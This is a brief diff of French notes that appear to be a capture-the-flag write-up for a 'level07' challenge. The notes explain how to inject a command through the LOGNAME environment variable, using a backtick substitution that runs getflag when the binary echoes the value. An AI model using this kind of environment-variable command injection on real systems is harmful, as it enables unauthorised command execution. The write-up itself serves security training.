@@ -1,0 +1,10 @@
+cat level07
+on voit : 
+> LOGNAME./bin/echo
+
+quand on exécute level07 il echo la variable d'environnement LOGNAME.
+
+donc on change LOGNAME en getflag :
+export LOGNAME=\`getflag\`
+
+et on réexécute ./level07
